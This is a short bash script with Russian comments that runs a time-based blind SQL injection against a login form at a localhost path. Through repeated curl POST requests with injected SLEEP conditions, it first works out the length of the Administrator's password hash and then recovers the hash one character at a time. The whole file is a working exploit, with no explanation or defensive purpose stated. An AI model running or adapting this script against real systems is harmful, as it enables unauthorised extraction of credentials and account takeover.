#!/bin/bash

URL="http://localhost/gareev/login.php"
db_name="webvex_db"
table_name="users"
admin_user="Administrator"

# Предположим, что $db_name и $table_name уже получены из предыдущего скрипта
# Если нет — можно запустить этот скрипт после предыдущего или передать значения

echo -e "\n\n[+] Пользователь : $admin_user"

# --------------------------------------------

echo -e "\n[+] Получаем длину хэша пароля..."

# Получаем длину пароля
len_pass=""
for i in {1..100}; do
  echo -n "."
  curl -s -X POST "$URL" \
       -d "username=test' OR IF(LENGTH((SELECT password FROM $table_name WHERE username='Administrator'))=$i, SLEEP(2), 0)-- -&password=anything" \
       --connect-timeout 3 --max-time 5 > /dev/null

  ret="$?"
  if [ "$ret" == "28" ]; then
    len_pass=$i
    break
  fi
done

echo -e "\n[+] Длина хэша пароля: $len_pass"

# Получаем хэш пароля посимвольно
admin_pass=""
for ((i=1; i<=$len_pass; i++)); do
  for c in {a..z} {A..Z} {0..9} _ \$ \! \@ \#; do
    curl -s -X POST "$URL" \
         -d "username=admin' OR IF(SUBSTRING((SELECT password FROM $table_name WHERE username='Administrator'),$i,1)='$c', SLEEP(2), 0)-- -&password=anything" \
         --connect-timeout 3 --max-time 5 > /dev/null

    ret="$?"
    if [ "$ret" == "28" ]; then
      admin_pass+="$c"
      dots=$(( len_pass - ${#admin_pass} ))
      dot_str=$(printf '%.0s.' $(seq 1 $dots))
      echo "admin_pass = $admin_pass$dot_str"
      break
    fi
  done
done

echo -e "\n\n[+] Хэш пароля пользователя '$admin_user': $admin_pass"
